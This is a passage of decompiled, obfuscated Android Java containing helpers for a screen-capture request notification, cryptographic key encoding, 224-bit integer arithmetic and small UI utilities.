        jArr2[i2 + 8] = jArr[8];
    }

    public static void r(Context context) {
        int i2 = Build.VERSION.SDK_INT;
        if (i2 < 33 || t40.o(context, "android.permission.POST_NOTIFICATIONS") == 0) {
            if (i2 >= 26) {
                NotificationChannel notificationChannelX = c60.x();
                notificationChannelX.setDescription("Request screen capture");
                NotificationManager notificationManager = (NotificationManager) context.getSystemService(NotificationManager.class);
                if (notificationManager != null) {
                    notificationManager.createNotificationChannel(notificationChannelX);
                }
            }
            Intent intent = new Intent(context, (Class<?>) ScreenRequestActivity.class);
            intent.setFlags(805306368);
            PendingIntent activity = PendingIntent.getActivity(context, 0, intent, 201326592);
            ai0 ai0Var = new ai0(context, "ScreenRequest");
            ai0Var.e = ai0.b("Screen Request");
            ai0Var.f = ai0.b("Click to start screen capture");
            ai0Var.n.icon = R.drawable.ic_dialog_alert;
            ai0Var.c(16, true);
            ai0Var.h = 1;
            ai0Var.g = activity;
            mi0 mi0Var = new mi0(context);
            Notification notificationA = ai0Var.a();
            Bundle bundle = notificationA.extras;
            if (bundle == null || !bundle.getBoolean("android.support.useSideChannel")) {
                mi0Var.a.notify(null, 101, notificationA);
                return;
            }
            ii0 ii0Var = new ii0(context.getPackageName(), notificationA);
            synchronized (mi0.e) {
                try {
                    if (mi0.f == null) {
                        mi0.f = new li0(context.getApplicationContext());
                    }
                    mi0.f.b.obtainMessage(0, ii0Var).sendToTarget();
                } catch (Throwable th) {
                    throw th;
                }
            }
            mi0Var.a.cancel(null, 101);
        }
    }

    public static sx0 s(s8 s8Var) throws IOException {
        if (s8Var instanceof d80) {
            d80 d80Var = (d80) s8Var;
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            byteArrayOutputStream.write((byte) 0);
            byteArrayOutputStream.write((byte) 0);
            byteArrayOutputStream.write((byte) 0);
            byteArrayOutputStream.write((byte) 1);
            try {
                byteArrayOutputStream.write(d80Var.b());
                return new sx0(new l4(vj0.g), new tk(byteArrayOutputStream.toByteArray()));
            } catch (Exception e2) {
                throw new RuntimeException(e2.getMessage(), e2);
            }
        }
        if (s8Var instanceof t20) {
            t20 t20Var = (t20) s8Var;
            ByteArrayOutputStream byteArrayOutputStream2 = new ByteArrayOutputStream();
            int i2 = t20Var.F;
            byteArrayOutputStream2.write((byte) (i2 >>> 24));
            byteArrayOutputStream2.write((byte) (i2 >>> 16));
            byteArrayOutputStream2.write((byte) (i2 >>> 8));
            byteArrayOutputStream2.write((byte) i2);
            try {
                byteArrayOutputStream2.write(t20Var.G.b());
                return new sx0(new l4(vj0.g), new tk(byteArrayOutputStream2.toByteArray()));
            } catch (Exception e3) {
                throw new RuntimeException(e3.getMessage(), e3);
            }
        }
        if (s8Var instanceof lq0) {
            lq0 lq0Var = (lq0) s8Var;
            return new sx0(new l4((d0) l31.e.get((jq0) lq0Var.F)), lq0Var.getEncoded());
        }
        if (s8Var instanceof ob0) {
            ob0 ob0Var = (ob0) s8Var;
            return new sx0(new l4((d0) l31.a.get((mb0) ob0Var.F)), z91.m(ob0Var.G, ob0Var.H));
        }
        if (!(s8Var instanceof jb0)) {
            throw new IOException("key parameters not recognized");
        }
        jb0 jb0Var = (jb0) s8Var;
        return new sx0(new l4((d0) l31.c.get((hb0) jb0Var.F)), jb0Var.getEncoded());
    }

    public static boolean t(int[] iArr, int[] iArr2) {
        for (int i2 = 6; i2 >= 0; i2--) {
            if (iArr[i2] != iArr2[i2]) {
                return false;
            }
        }
        return true;
    }

    public static int[] u(BigInteger bigInteger) {
        if (bigInteger.signum() < 0 || bigInteger.bitLength() > 224) {
            throw new IllegalArgumentException();
        }
        int[] iArr = new int[7];
        for (int i2 = 0; i2 < 7; i2++) {
            iArr[i2] = bigInteger.intValue();
            bigInteger = bigInteger.shiftRight(32);
        }
        return iArr;
    }

    public static int v(int[] iArr) {
        return iArr[0] & 1;
    }

    public static float w(String[] strArr, int i2) {
        float f2 = Float.parseFloat(strArr[i2]);
        if (f2 >= 0.0f && f2 <= 1.0f) {
            return f2;
        }
        throw new IllegalArgumentException("Motion easing control point value must be between 0 and 1; instead got: " + f2);
    }

    public static void x(int i2, byte[] bArr, int[] iArr) {
        int length = iArr.length * 2;
        int[] iArr2 = new int[length];
        int i3 = iArr[iArr.length - 1] >> 31;
        int length2 = iArr.length;
        int i4 = length;
        while (true) {
            length2--;
            if (length2 < 0) {
                break;
            }
            int i5 = iArr[length2];
            iArr2[i4 - 1] = (i3 << 16) | (i5 >>> 16);
            i4 -= 2;
            iArr2[i4] = i5;
            i3 = i5;
        }
        int i6 = 32 - i2;
        int i7 = 0;
        int i8 = 0;
        int i9 = 0;
        while (i7 < length) {
            int i10 = iArr2[i7];
            while (i8 < 16) {
                int i11 = i10 >>> i8;
                if ((i11 & 1) == i9) {
                    i8++;
                } else {
                    int i12 = (i11 | 1) << i6;
                    bArr[(i7 << 4) + i8] = (byte) (i12 >> i6);
                    i8 += i2;
                    i9 = i12 >>> 31;
                }
            }
            i7++;
            i8 -= 16;
        }
    }

    public static int y(Context context) {
        int identifier = context.getApplicationContext().getResources().getIdentifier("status_bar_height", "dimen", "android");
        if (identifier > 0) {
            return context.getApplicationContext().getResources().getDimensionPixelSize(identifier);
        }
        return 100;
    }

    public static boolean z(int[] iArr, int[] iArr2) {
        for (int i2 = 6; i2 >= 0; i2--) {
            int i3 = iArr[i2] ^ Integer.MIN_VALUE;
            int i4 = Integer.MIN_VALUE ^ iArr2[i2];
            if (i3 < i4) {
                return false;
            }
            if (i3 > i4) {
                return true;
            }
        }
        return true;
    }

    public abstract void O(int i2);

    public abstract void P(Typeface typeface, boolean z);

    @Override // defpackage.zv0
    public float d(ViewGroup viewGroup, View view) {
        return view.getTranslationX();
    }

    public void b() {
    }

    public void e() {
    }
}
